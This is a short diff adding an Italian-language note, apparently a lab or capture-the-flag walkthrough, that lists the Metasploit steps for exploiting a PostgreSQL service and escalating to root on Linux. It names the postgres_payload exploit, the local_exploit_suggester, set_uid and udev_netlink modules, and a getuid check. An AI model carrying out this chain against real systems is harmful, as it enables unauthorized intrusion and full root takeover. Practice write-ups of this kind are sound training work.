@@ -1,0 +1,7 @@
+1) per primo cosa : search exploit/linux/postgres/postgres_payload
+2) in questo caso : use 0
+3) options (configuro cio che è necessario)
+4) uso post/multi/recon/local_exploit_suggester
+5) uso exploit/unix/local/set_uid (non funzionava ,perché non sapevo che dovevo cambiare target da x64 a x86)
+6) uso linux/local/udev_netlink ,configurando cio che è richiesto, 
+7) con il comando getuid : mi da root
